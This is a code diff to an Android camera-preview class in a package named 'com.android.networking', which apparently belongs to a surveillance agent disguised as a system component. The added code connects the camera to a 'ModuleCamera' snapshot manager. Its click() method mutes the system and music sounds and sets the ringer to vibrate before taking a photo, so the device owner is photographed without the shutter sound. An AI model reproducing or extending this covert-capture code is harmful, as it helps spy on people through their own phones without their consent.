@@ -6,6 +6,8 @@ import java.io.IOException;
 
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
+import com.android.networking.interfaces.SnapshotManager;
+import com.android.networking.module.ModuleCamera;
 import com.android.networking.util.Check;
 
 import android.content.Context;
@@ -50,7 +52,11 @@ public class Preview extends SurfaceView implements SurfaceHolder.Callback {
 			}
 		}
 	};
-	
+
+	private SurfaceHolder holder;
+
+	private SnapshotManager snapshotManager;
+
 	Preview(AGUI context) {
 		super(context);
 		agui = context;
@@ -63,7 +69,10 @@ public class Preview extends SurfaceView implements SurfaceHolder.Callback {
 	}
 
 	// Called once the holder is ready
-	public void surfaceCreated(SurfaceHolder holder) { // <7>
+	public void surfaceCreated(SurfaceHolder holder) {
+		this.holder = holder;
+
+		// <7>
 		// The Surface has been created, acquire the camera and tell it where
 		// to draw.
 		camera = Camera.open(); // <8>
@@ -77,33 +86,73 @@ public class Preview extends SurfaceView implements SurfaceHolder.Callback {
 			camera.setPreviewCallback(new PreviewCallback() { // <10>
 				// Called for each frame previewed
 				public void onPreviewFrame(byte[] data, Camera camera) { // <11>
-					Log.d(TAG, "onPreviewFrame called at: " + System.currentTimeMillis());
 					Preview.this.invalidate(); // <12>
 				}
 			});
 		} catch (IOException e) { // <13>
-			e.printStackTrace();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (startCamera) Error: " + e);
+			}
+		}
+		
+		camera.startPreview();
+		
+	}
+
+	public boolean startCamera(SnapshotManager moduleCamera) {
+		this.snapshotManager = moduleCamera;
+		if (holder == null) {
+			return false;
+		}
+		return true;
+		
+	}
+
+	public void stopCamera() {
+
+		if (camera != null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (stopCamera): ");
+			}
+			camera.stopPreview();
+			try {
+				camera.setPreviewDisplay(null);
+			} catch (IOException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+			camera.release();
+			
+			camera = null;
 		}
 	}
 
 	// Called when the holder is destroyed
 	public void surfaceDestroyed(SurfaceHolder holder) { // <14>
-		camera.stopPreview();
-		camera = null;
+		stopCamera();
 	}
 
 	// Called when holder has changed
 	public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) { // <15>
-		camera.startPreview();
+		if (camera != null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (surfaceChanged): startPreview");
+			}
+			
+		}
 	}
-	
+
 	public void click() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (click)");
+		}
 		AudioManager audioManager = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
 
 		audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
-		audioManager.setStreamMute(AudioManager.STREAM_MUSIC,true);
-		//audioManager.setRingerMode(AudioManager.RINGER_MODE_VIBRATE);
-		camera.takePicture(shutterCallback, rawCallback, jpegCallback);
+		audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
+		audioManager.setRingerMode(AudioManager.RINGER_MODE_VIBRATE);
+		
+		camera.takePicture(shutterCallback, rawCallback, snapshotManager);
 	}
 
 }
